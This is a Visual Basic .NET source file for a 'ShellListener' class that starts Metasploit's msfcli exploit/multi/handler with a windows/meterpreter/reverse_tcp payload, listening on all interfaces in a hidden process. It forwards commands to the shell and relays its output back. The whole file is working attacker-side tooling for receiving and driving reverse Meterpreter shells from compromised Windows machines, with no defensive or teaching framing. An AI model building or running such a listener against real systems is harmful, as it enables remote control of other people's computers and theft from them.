Imports System.IO
Imports System.Text

''' <summary>
''' Meterpreter Shell Listener
''' </summary>
Public Class ShellListener
    Implements IDisposable

    ''' <summary>
    ''' Occurs when data received from the shell.
    ''' </summary>
    Public Event DataReceived(ByVal sender As Object, ByVal e As DataReceivedEventArgs)

    Private _Name As String
    Public Property Name() As String
        Get
            Return _Name
        End Get
        Set(ByVal value As String)
            _Name = value
        End Set
    End Property

    Public Sub New(ByVal name As String)
        Me.New()
        Me.Name = name
    End Sub

    ''' <summary>
    ''' Sends the command to standard input.
    ''' </summary>
    ''' <param name="cmd">The CMD.</param>
    Public Sub SendCommand(ByVal cmd As String)
        If StdIn Is Nothing Then Exit Sub
        StdIn.WriteLine(cmd)
    End Sub

    Private RubyExecutable As String = My.Settings.RubyExecutable
    Private IPAddress As String = "0.0.0.0"
    Private BindPort As Integer = My.Settings.BindPort
    Private MsfCliPath As String = My.Settings.MsfcliPath

    Public Sub New()
        Shell = New Process()
        With Shell
            .StartInfo.FileName = RubyExecutable
            .StartInfo.Arguments = String.Format("{0} msfcli exploit/multi/handler LHOST={1} LPORT={2} PAYLOAD=windows/meterpreter/reverse_tcp E", "", IPAddress, BindPort.ToString())
            .StartInfo.UseShellExecute = False
            .StartInfo.CreateNoWindow = True
            .StartInfo.RedirectStandardInput = True
            .StartInfo.RedirectStandardOutput = True
            .StartInfo.RedirectStandardError = True
            .StartInfo.WorkingDirectory = MsfCliPath
        End With
    End Sub

    ''' <summary>
    ''' Ruby process which runs the listener
    ''' </summary>
    Private Shell As Process

    ''' <summary>
    ''' Standard Input
    ''' </summary>
    Private StdIn As StreamWriter

    ''' <summary>
    ''' Starts listening
    ''' </summary>
    Public Sub Listen()

        With Shell
            Try

                .Start()
                .BeginOutputReadLine()
                .BeginErrorReadLine()

                AddHandler .OutputDataReceived, AddressOf ForwardData
                AddHandler .ErrorDataReceived, AddressOf ForwardData

                StdIn = .StandardInput
                StdIn.AutoFlush = True

                .WaitForExit()
            Catch ex As Exception
                Debug.WriteLine(ex.ToString)

            End Try

End With

    End Sub

    Private Sub ForwardData(ByVal sender As Object, ByVal e As DataReceivedEventArgs)
        RaiseEvent DataReceived(Me, e)
    End Sub

    Private disposedValue As Boolean = False        ' To detect redundant calls

    Public Sub Close()
        Try
            If Shell IsNot Nothing Then
                Shell.Kill()
                Shell.Dispose()
            End If
        Catch ex As Exception

        End Try
    End Sub


    ' IDisposable
    Protected Overridable Sub Dispose(ByVal disposing As Boolean)
        If Not Me.disposedValue Then
            If disposing Then
                If StdIn IsNot Nothing Then StdIn.Close()
                Me.Close()
            End If

            ' TODO: free your own state (unmanaged objects).
            ' TODO: set large fields to null.
        End If
        Me.disposedValue = True
    End Sub

#Region " IDisposable Support "
    ' This code added by Visual Basic to correctly implement the disposable pattern.
    Public Sub Dispose() Implements IDisposable.Dispose
        ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
        Dispose(True)
        GC.SuppressFinalize(Me)
    End Sub
#End Region

    Public Sub RefreshPort()
        Shell.Kill()
        BindPort = My.Settings.BindPort
        Shell = New Process()
        With Shell
            .StartInfo.FileName = RubyExecutable
            .StartInfo.Arguments = String.Format("{0} msfcli exploit/multi/handler LHOST={1} LPORT={2} PAYLOAD=windows/meterpreter/reverse_tcp E", "", IPAddress, BindPort.ToString())
            .StartInfo.UseShellExecute = False
            .StartInfo.CreateNoWindow = True
            .StartInfo.RedirectStandardInput = True
            .StartInfo.RedirectStandardOutput = True
            .StartInfo.RedirectStandardError = True
            .StartInfo.WorkingDirectory = MsfCliPath
        End With

    End Sub

End Class
